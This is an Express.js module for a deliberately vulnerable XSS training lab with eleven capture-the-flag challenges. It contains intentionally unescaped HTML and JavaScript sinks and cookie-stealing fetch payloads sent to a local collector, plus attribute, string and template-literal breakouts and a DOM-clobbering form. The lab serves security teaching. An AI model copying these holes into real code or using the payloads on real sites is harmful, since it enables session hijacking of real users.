// PenTrix VulnLab module: Cross-Site Scripting (xss)
// Three classic flavors: reflected, stored, DOM-based. Each one exfiltrates the
// (deliberately non-httpOnly) session cookie to /xss/collect to capture its flag.
const express = require('express');
const { getDb } = require('../../lib/db');
const { page, esc, flagBox, hintBox, brief } = require('../../lib/page');
const { award, captured } = require('../../lib/flags');

const router = express.Router();
// Router-scoped form parsing only (app-level middleware is out of scope).
router.use(express.urlencoded({ extended: false }));

const VULN_IDS = [
  'reflected', 'stored', 'dom',
  'stored-xss-profile', 'xss-attr-breakout', 'xss-js-context', 'xss-svg-upload',
  'xss-markdown', 'xss-dom-clobber', 'xss-hash-write', 'xss-backtick',
];

// Challenge page slug per vuln id (used by the index page links).
const PAGE_FOR = {
  reflected: 'search', 'stored': 'guestbook', dom: 'dom',
  'stored-xss-profile': 'profile', 'xss-attr-breakout': 'attr',
  'xss-js-context': 'jsctx', 'xss-svg-upload': 'svg',
  'xss-markdown': 'markdown', 'xss-dom-clobber': 'clobber',
  'xss-hash-write': 'hashwrite', 'xss-backtick': 'backtick',
};

// The canonical exfiltration payload, taught in the briefing and collect page.
const EXFIL_PAYLOAD = "<script>fetch('/xss/collect?c='+document.cookie+'&v=reflected')</script>";

const BRIEF_HTML = `
<p><b>What is XSS?</b> The app takes attacker-controlled input and renders it in the
browser as HTML/JavaScript without neutralizing it. Your script then runs in the
victim's browser, in their session.</p>
<p><b>The goal in this module:</b> steal the session cookie. This lab deliberately
sets the session cookie with <code>httpOnly:false</code>, so JavaScript can read
<code>document.cookie</code>.</p>
<p><b>The payload pattern (memorize it):</b></p>
<pre><code>${esc(EXFIL_PAYLOAD)}</code></pre>
<p>Swap <code>v=reflected</code> for <code>v=stored</code> or <code>v=dom</code> to
claim the flag for each vuln. Paste the payload into the vulnerable field; your
browser fires the <code>/xss/collect</code> request and the flag is awarded.</p>`;

// ---------------------------------------------------------------- index page
router.get('/', (req, res) => {
  const vulns = module.exports.vulns;
  const rows = vulns.map((v) => {
    const done = captured(req, 'xss', v.id);
    return `
      <div class="vuln-card">
        <h3><a href="/xss/${PAGE_FOR[v.id] || v.id}">${esc(v.name)}</a>
          <span class="diff">${esc(v.difficulty)}</span>
          ${done ? '<span class="captured">flag captured</span>' : ''}
        </h3>
        ${hintBox(v.hint)}
        <p><i>Attack:</i> ${esc(v.how)}</p>
      </div>`;
  }).join('\n');

  const collector = vulns.some((v) => captured(req, 'xss', v.id))
    ? ''
    : `<p>Nothing captured yet. Each challenge page links its own attack surface.</p>`;

  res.send(page('Cross-Site Scripting', `
    ${brief('Module briefing', BRIEF_HTML)}
    <h2>Challenges</h2>
    ${rows}
    ${collector}
    <h2>Cookie thief endpoint</h2>
    <p>Payloads phone home to <code>/xss/collect?c=&lt;data&gt;&amp;v=&lt;vuln-id&gt;</code>.
    It awards the flag only when the beacon actually arrives with data.</p>
  `));
});

// ------------------------------------------------------------ v1: reflected
router.get('/search', (req, res) => {
  const q = req.query.q || '';
  // VULN: user input interpolated into HTML with no output encoding.
  const result = q
    ? `<h3>Results for: ${q}</h3><p>No products matched "${q}". Try another search.</p>`
    : `<p>Type something in the search box. The query is echoed back into this page.</p>`;
  res.send(page('Search (Reflected XSS)', `
    <h2>Product search</h2>
    <form method="GET" action="/xss/search">
      <input type="text" name="q" value="${esc(q)}" placeholder="search products..." size="40" />
      <button type="submit">Search</button>
    </form>
    <hr />${result}
    <p class="note">Try a payload like <code>${esc(EXFIL_PAYLOAD)}</code> as the search term.</p>
  `));
});

// --------------------------------------------------------------- v2: stored
router.get('/guestbook', (req, res) => {
  const db = getDb();
  // The shared comments table is seeded with one benign comment already.
  const rows = db.prepare('SELECT author, body, created_at FROM comments ORDER BY id DESC').all();
  const items = rows.map((r) => `
    <div class="comment">
      <b>${r.author}</b> <span class="muted">${esc(r.created_at)}</span>
      <p>${r.body}</p>
    </div>`).join('\n');
  // VULN: stored comment bodies are rendered raw, no output encoding.
  res.send(page('Guestbook (Stored XSS)', `
    <h2>Guestbook</h2>
    <p>Leave a comment. Everyone who views this page runs whatever you stored.</p>
    <form method="POST" action="/xss/guestbook">
      <input type="text" name="author" placeholder="your name" required /><br /><br />
      <textarea name="body" rows="4" cols="60" placeholder="your message" required></textarea><br /><br />
      <button type="submit">Sign guestbook</button>
    </form>
    <hr /><h3>Messages</h3>${items}
    <p class="note">Stored payload idea: post
      <code>${esc(EXFIL_PAYLOAD.replace('v=reflected', 'v=stored'))}</code>
      as a comment, then reload this page.</p>
  `));
});

router.post('/guestbook', (req, res) => {
  const author = (req.body.author || '').slice(0, 80);
  const body = (req.body.body || '').slice(0, 2000);
  if (!author.trim() || !body.trim()) {
    return res.status(400).send(page('Guestbook', '<p>Author and message are required.</p><p><a href="/xss/guestbook">Back</a></p>'));
  }
  const db = getDb();
  // Prepared statement keeps this about XSS only; input is stored verbatim.
  db.prepare('INSERT INTO comments (author, body) VALUES (?, ?)').run(author, body);
  res.redirect('/xss/guestbook');
});

// ------------------------------------------------------------- v3: DOM-based
router.get('/dom', (req, res) => {
  const demoPayload = '<img src=x onerror=alert(1)>';
  const demoUrl = '/xss/dom#' + demoPayload;
  res.send(page('DOM XSS playground', `
    <h2>Welcome message (DOM-based)</h2>
    <p>This page takes whatever is after the <code>#</code> in the URL and drops
    it into the page with JavaScript. Nothing is ever sent to the server.</p>
    <div id="out" style="border:1px dashed #888; padding:1em; min-height:2em;"></div>
    <script>
      // VULN: location.hash flows straight into innerHTML with no sanitization.
      document.getElementById('out').innerHTML = location.hash.slice(1);
    </script>
    <hr />
    <p><b>Try it:</b> <a href="${esc(demoUrl)}">click here for the demo link</a>
    (it opens this same page with <code>${esc(demoPayload)}</code> in the fragment).</p>
    <p class="note">For the flag, use the exfiltration payload with
      <code>v=dom</code>, URL-encoded into the fragment, e.g.
      <code>/xss/dom#&lt;script&gt;fetch('/xss/collect?c='+document.cookie+'&amp;v=dom')&lt;/script&gt;</code>.</p>
  `));
});

// ---------------------------------------------------- v4: stored profile
function getProfileBio() {
  const db = getDb();
  db.exec('CREATE TABLE IF NOT EXISTS xss_profiles (id INTEGER PRIMARY KEY, bio TEXT)');
  db.prepare('INSERT OR IGNORE INTO xss_profiles (id, bio) VALUES (1, ?)').run('Just a regular user. Nothing to see here.');
  return db.prepare('SELECT bio FROM xss_profiles WHERE id = 1').get().bio;
}

router.get('/profile', (req, res) => {
  const bio = getProfileBio();
  // VULN: the stored bio is rendered raw with no output encoding.
  res.send(page('Profile (Stored XSS)', `
    <h2>User profile</h2>
    <p>Your bio is stored and shown to everyone who visits this page.</p>
    <div class="comment"><b>you</b><p>${bio}</p></div>
    <hr />
    <form method="POST" action="/xss/profile">
      <textarea name="bio" rows="4" cols="60" placeholder="write your bio" required></textarea><br /><br />
      <button type="submit">Save bio</button>
    </form>
    <p class="note">Stored payload idea: save
      <code>${esc(EXFIL_PAYLOAD.replace('v=reflected', 'v=stored-xss-profile'))}</code>
      as your bio, then reload this page.</p>
  `));
});

router.post('/profile', (req, res) => {
  const bio = (req.body.bio || '').slice(0, 2000);
  if (!bio.trim()) {
    return res.status(400).send(page('Profile', '<p>Bio is required.</p><p><a href="/xss/profile">Back</a></p>'));
  }
  getProfileBio(); // ensure the table exists before updating
  getDb().prepare('UPDATE xss_profiles SET bio = ? WHERE id = 1').run(bio);
  res.redirect('/xss/profile');
});

// ------------------------------------------------- v5: attribute breakout
router.get('/attr', (req, res) => {
  const n = req.query.n || '';
  // VULN: user input reflected raw inside an HTML attribute value.
  res.send(page('Attribute breakout', `
    <h2>Nickname preview</h2>
    <form method="GET" action="/xss/attr">
      <input type="text" name="n" value="${esc(n)}" placeholder="nickname" size="40" />
      <button type="submit">Preview</button>
    </form>
    <hr />
    <p>Preview card:</p>
    <div class="comment">Hello, <input type="text" value="${n}" readonly /></div>
    <p class="note">The nickname is dropped raw into <code>value="..."</code>.
    Close the attribute with <code>"&gt;</code> and inject your own tag, e.g.
    <code>"&gt;&lt;script&gt;...&lt;/script&gt;</code> with
    <code>v=xss-attr-breakout</code> in the exfiltration payload.</p>
  `));
});

// ------------------------------------------------------ v6: JS string sink
router.get('/jsctx', (req, res) => {
  const q = req.query.q || '';
  // VULN: user input reflected raw inside a single-quoted JavaScript string.
  res.send(page('JS string context', `
    <h2>Greeting generator</h2>
    <form method="GET" action="/xss/jsctx">
      <input type="text" name="q" value="${esc(q)}" placeholder="your name" size="40" />
      <button type="submit">Greet</button>
    </form>
    <hr />
    <div id="greet"></div>
    <script>
      var q = '${q}';
      document.getElementById('greet').textContent = 'Hello, ' + q + '!';
    </script>
    <p class="note">Your input lands inside a JavaScript string literal. Break out of
    the string with a quote, run your own statement, then comment out the rest
    with <code>//</code>.</p>
  `));
});

// ---------------------------------------------------------- v7: SVG upload
const fs = require('fs');
const path = require('path');
const UPLOAD_DIR = path.join(__dirname, 'uploads');
try { fs.mkdirSync(UPLOAD_DIR, { recursive: true }); } catch (e) { /* already exists */ }

router.get('/svg', (req, res) => {
  let files = [];
  try { files = fs.readdirSync(UPLOAD_DIR).filter((f) => f.endsWith('.svg')); } catch (e) { /* none */ }
  const list = files.map((f) => `<li><a href="/xss/uploads/${esc(f)}">${esc(f)}</a></li>`).join('')
    || '<li><i>no uploads yet</i></li>';
  res.send(page('SVG upload', `
    <h2>Avatar SVG upload</h2>
    <p>Paste SVG markup. It is saved and served back as <code>image/svg+xml</code>.
    Opening the file URL directly executes any script inside it.</p>
    <form method="POST" action="/xss/svg">
      <input type="text" name="name" placeholder="file name" size="20" /><br /><br />
      <textarea name="svg" rows="8" cols="60" placeholder="&lt;svg ...&gt;...&lt;/svg&gt;" required></textarea><br /><br />
      <button type="submit">Upload SVG</button>
    </form>
    <hr /><h3>Uploaded files</h3><ul>${list}</ul>
    <p class="note">Upload idea: an <code>&lt;svg&gt;</code> containing
    <code>&lt;script&gt;fetch('/xss/collect?c='+document.cookie+'&amp;v=xss-svg-upload')&lt;/script&gt;</code>,
    then open its link directly.</p>
  `));
});

router.post('/svg', (req, res) => {
  const raw = (req.body.svg || '').slice(0, 20000);
  const name = (req.body.name || 'pic').replace(/[^a-z0-9_-]/gi, '').slice(0, 32) || 'pic';
  if (!/<svg[\s>]/i.test(raw)) {
    return res.status(400).send(page('SVG upload', '<p>That does not look like SVG markup.</p><p><a href="/xss/svg">Back</a></p>'));
  }
  const file = `${name}-${Date.now()}.svg`;
  // VULN: attacker-controlled SVG is stored and served as image/svg+xml, so embedded scripts run on direct visit.
  fs.writeFileSync(path.join(UPLOAD_DIR, file), raw);
  res.redirect('/xss/uploads/' + file);
});

router.get('/uploads/:file', (req, res) => {
  const file = req.params.file;
  if (!/^[a-zA-Z0-9_-]+\.svg$/.test(file)) return res.status(400).send('bad filename');
  const full = path.join(UPLOAD_DIR, file);
  if (!full.startsWith(UPLOAD_DIR) || !fs.existsSync(full)) return res.status(404).send('not found');
  res.set('Content-Type', 'image/svg+xml');
  res.send(fs.readFileSync(full, 'utf8'));
});

// ----------------------------------------------------- v8: naive markdown
function naiveMarkdown(src) {
  let html = String(src);
  // VULN: link URLs pass through with no scheme validation, so javascript: URLs survive.
  html = html.replace(/\[([^\]]+)\]\(([^)\s]+)\)/g, '<a href="$2">$1</a>');
  html = html.replace(/\*\*([^*]+)\*\*/g, '<b>$1</b>');
  html = html.replace(/\n/g, '<br>');
  return html;
}

router.get('/markdown', (req, res) => {
  res.send(page('Markdown renderer', `
    <h2>Markdown preview</h2>
    <p>Type markdown. Links, bold, and line breaks are rendered.</p>
    <form method="POST" action="/xss/markdown">
      <textarea name="md" rows="6" cols="60" placeholder="[click me](https://example.com)" required></textarea><br /><br />
      <button type="submit">Render</button>
    </form>
    <p class="note">The renderer trusts link destinations completely. What URL schemes can a link use?</p>
  `));
});

router.post('/markdown', (req, res) => {
  const md = (req.body.md || '').slice(0, 5000);
  // VULN: naive markdown turns [text](javascript:...) into a live javascript: link.
  const html = naiveMarkdown(md);
  res.send(page('Markdown renderer', `
    <h2>Rendered output</h2>
    <div class="comment">${html}</div>
    <hr />
    <p>Source:</p>
    <pre><code>${esc(md)}</code></pre>
    <p><a href="/xss/markdown">Render another</a></p>
  `));
});

// --------------------------------------------------- v9: DOM clobbering
function stripScripts(html) {
  return String(html).replace(/<script\b[^>]*>[\s\S]*?<\/script\s*>/gi, '');
}

function getClobberHtml() {
  const db = getDb();
  db.exec('CREATE TABLE IF NOT EXISTS xss_clobber (id INTEGER PRIMARY KEY, html TEXT)');
  db.prepare('INSERT OR IGNORE INTO xss_clobber (id, html) VALUES (1, ?)').run('<b>Nothing here yet.</b>');
  return db.prepare('SELECT html FROM xss_clobber WHERE id = 1').get().html;
}

router.get('/clobber', (req, res) => {
  // VULN: the sanitizer only strips <script> tags; form/input markup is stored and rendered raw.
  const clean = stripScripts(getClobberHtml());
  res.send(page('Custom HTML (DOM clobbering)', `
    <h2>Profile custom HTML</h2>
    <p>Add custom HTML to your profile. Scripts are stripped for your safety.</p>
    <div id="custom" style="border:1px dashed #888; padding:1em;">${clean}</div>
    <div id="adminpanel" style="display:none; border:2px solid red; padding:1em; margin-top:1em;">
      <h3>Admin panel</h3>
      <p>The page script believes you are an admin.</p>
      <p><a href="/xss/clobber-admin">Enter the admin panel to claim your flag</a></p>
    </div>
    <script>
      // VULN: page trusts window.settings, which injected markup can clobber via id/name.
      if (window.settings && window.settings.isAdmin) {
        document.getElementById('adminpanel').style.display = 'block';
      }
    </script>
    <hr />
    <form method="POST" action="/xss/clobber">
      <textarea name="html" rows="6" cols="60" placeholder="&lt;b&gt;hello&lt;/b&gt;" required></textarea><br /><br />
      <button type="submit">Save custom HTML</button>
    </form>
    <p class="note">The filter removes <code>&lt;script&gt;</code> but keeps
    <code>&lt;form&gt;</code> and <code>&lt;input&gt;</code>. The page script checks
    <code>window.settings.isAdmin</code>. Can markup alone create a <code>window.settings</code>?</p>
  `));
});

router.post('/clobber', (req, res) => {
  const html = (req.body.html || '').slice(0, 5000);
  getClobberHtml(); // ensure the table exists before updating
  getDb().prepare('UPDATE xss_clobber SET html = ? WHERE id = 1').run(html);
  res.redirect('/xss/clobber');
});

router.get('/clobber-admin', (req, res) => {
  const raw = getClobberHtml();
  const hasForm = /<form\b[^>]*\bid\s*=\s*["']?settings["']?/i.test(raw);
  const hasInput = /<input\b[^>]*\bname\s*=\s*["']?isAdmin["']?/i.test(raw);
  // Award only when the stored markup would genuinely clobber window.settings.isAdmin
  // (the form becomes window.settings, its named input becomes .isAdmin).
  if (hasForm && hasInput) {
    const flag = award(req, 'xss', 'xss-dom-clobber');
    return res.send(page('Admin panel', `
      <h2>Admin panel unlocked</h2>
      <p>Your markup clobbered <code>window.settings</code>: the form became
      <code>window.settings</code> and its named input became <code>.isAdmin</code>,
      so the page script treated you as an admin.</p>
      ${flagBox(flag)}
      <p><a href="/xss">Back to the XSS module</a></p>
    `));
  }
  res.send(page('Admin panel', `
    <h2>Access denied</h2>
    <p>The admin panel only unlocks when the page script sees a truthy
    <code>window.settings.isAdmin</code>. Your custom HTML does not do that yet.</p>
    <p><a href="/xss/clobber">Back to custom HTML</a></p>
  `));
});

// ------------------------------------------------- v10: hash to document.write
router.get('/hashwrite', (req, res) => {
  res.send(page('Hash writer', `
    <h2>Shareable message</h2>
    <p>This page writes whatever is after the <code>#</code> straight into the document.</p>
    <div id="msg"></div>
    <script>
      // VULN: location.hash flows into document.write with no sanitization.
      document.write(location.hash.slice(1));
    </script>
    <hr />
    <p><b>Try it:</b> open <code>/xss/hashwrite#&lt;script&gt;...&lt;/script&gt;</code>
    (URL-encoded). Use the exfiltration payload with <code>v=xss-hash-write</code>.</p>
  `));
});

// ---------------------------------------------- v11: template literal sink
router.get('/backtick', (req, res) => {
  const m = req.query.m || '';
  // VULN: user input reflected raw inside a JavaScript template literal.
  res.send(page('Template literal', `
    <h2>Status message</h2>
    <form method="GET" action="/xss/backtick">
      <input type="text" name="m" value="${esc(m)}" placeholder="status" size="40" />
      <button type="submit">Set status</button>
    </form>
    <hr />
    <div id="status"></div>
    <script>
      var msg = \`${m}\`;
      document.getElementById('status').textContent = msg;
    </script>
    <p class="note">Your input lands inside a template literal (backticks). The
    <code>\${...}</code> syntax evaluates expressions right inside the string.</p>
  `));
});

// ------------------------------------------------------- flag capture beacon
router.get('/collect', (req, res) => {
  const c = (req.query.c || '').toString();
  const v = (req.query.v || '').toString();
  // Only award when a real beacon arrives: non-empty stolen data and a known vuln id.
  if (c.length > 0 && VULN_IDS.includes(v)) {
    const flag = award(req, 'xss', v);
    return res.send(page('Cookie collector', `
      <h2>Beacon received</h2>
      <p>Captured <b>${c.length}</b> characters of data for vuln
      <b>${esc(v)}</b>. Flag awarded:</p>
      ${flagBox(flag)}
      <p><a href="/xss">Back to the XSS module</a></p>
    `));
  }
  res.status(400).send(page('Cookie collector', `
    <h2>No flag</h2>
    <p>This endpoint only awards a flag when a real exfiltration beacon arrives
    with non-empty data (<code>c</code>) and a valid vuln id
    (<code>v</code> = reflected, stored, dom, stored-xss-profile, xss-attr-breakout,
    xss-js-context, xss-svg-upload, xss-markdown, xss-dom-clobber, xss-hash-write,
    or xss-backtick).</p>
    <p>The intended payload:</p>
    <pre><code>${esc(EXFIL_PAYLOAD)}</code></pre>
  `));
});

module.exports = {
  id: 'xss',
  name: 'Cross-Site Scripting',
  tagline: 'Inject JavaScript, steal the session cookie, capture eleven flags.',
  description: 'Eleven cross-site scripting flaws: a reflected search box, a stored guestbook, and a DOM-based fragment sink, plus eight more - a stored profile bio, attribute and JS-string breakouts, a malicious SVG upload, a naive markdown renderer, DOM clobbering, a hash-to-document.write sink, and template-literal injection.',
  difficulty: 'Mixed',
  vulns: [
    {
      id: 'reflected',
      name: 'Reflected XSS',
      difficulty: 'Easy',
      hint: 'The search term is echoed straight back into the results page. What happens if the "search term" is HTML?',
      how: 'Put a script payload in the search box so it executes when the results page renders.',
    },
    {
      id: 'stored',
      name: 'Stored XSS',
      difficulty: 'Easy',
      hint: 'Comments are saved and shown to every visitor unescaped. Your payload persists and fires on every page view.',
      how: 'Post the exfiltration payload as a guestbook comment, then reload the page so your own browser fires it.',
    },
    {
      id: 'dom',
      name: 'DOM-based XSS',
      difficulty: 'Medium',
      hint: 'The server never sees the fragment. JavaScript on the page copies location.hash into innerHTML. Craft the URL.',
      how: 'Build a /xss/dom#... link whose fragment contains the exfiltration payload, then open it.',
    },
    {
      id: 'stored-xss-profile',
      name: 'Stored XSS in Profile Bio',
      difficulty: 'Easy',
      hint: 'The bio is saved verbatim and rendered raw on the profile page. Anything you store runs for every visitor.',
      how: 'Save the exfiltration payload (with v=stored-xss-profile) as your bio, then reload the profile page.',
    },
    {
      id: 'xss-attr-breakout',
      name: 'XSS via Attribute Breakout',
      difficulty: 'Medium',
      hint: 'Your input lands inside value="...". The quote is not escaped, so you can close the attribute and open a new tag.',
      how: 'Submit "> followed by a script tag carrying the exfiltration payload (v=xss-attr-breakout).',
    },
    {
      id: 'xss-js-context',
      name: 'XSS in a JavaScript String',
      difficulty: 'Medium',
      hint: "Your input lands inside a single-quoted JS string: var q = '...'. Break out of the string, run your code, and comment out the tail.",
      how: "Submit ';fetch('/xss/collect?c='+document.cookie+'&v=xss-js-context');// to break out of the string.",
    },
    {
      id: 'xss-svg-upload',
      name: 'Stored XSS via SVG Upload',
      difficulty: 'Medium',
      hint: 'Uploaded SVGs are served as image/svg+xml. An SVG is XML, and XML can carry a script tag that runs when the file is opened directly.',
      how: 'Upload an SVG containing a script with the exfiltration payload (v=xss-svg-upload), then open the file URL.',
    },
    {
      id: 'xss-markdown',
      name: 'XSS via Naive Markdown Links',
      difficulty: 'Medium',
      hint: 'The renderer turns [text](url) into a link but never checks the URL scheme. Links are not limited to http(s).',
      how: 'Render [click](javascript:...) so the link target becomes a javascript: URL, then click it.',
    },
    {
      id: 'xss-dom-clobber',
      name: 'DOM Clobbering to Admin',
      difficulty: 'Hard',
      hint: 'Scripts are stripped, but form and input tags survive. The page script trusts window.settings.isAdmin. Named elements in the DOM become window properties.',
      how: 'Inject <form id="settings"><input name="isAdmin" value="1"> so window.settings.isAdmin becomes truthy, then open the admin panel.',
    },
    {
      id: 'xss-hash-write',
      name: 'DOM XSS via document.write',
      difficulty: 'Medium',
      hint: 'A second fragment sink, distinct from the innerHTML lab: this page feeds location.hash into document.write.',
      how: 'Open /xss/hashwrite# with a URL-encoded script payload (v=xss-hash-write) in the fragment.',
    },
    {
      id: 'xss-backtick',
      name: 'XSS in a Template Literal',
      difficulty: 'Medium',
      hint: 'Your input lands inside backticks: var msg = `...`. Template literals evaluate ${...} expressions inline.',
      how: 'Submit ${fetch(\'/xss/collect?c=\'+document.cookie+\'&v=xss-backtick\')} to execute code inside the literal.',
    },
  ],
  router,
};
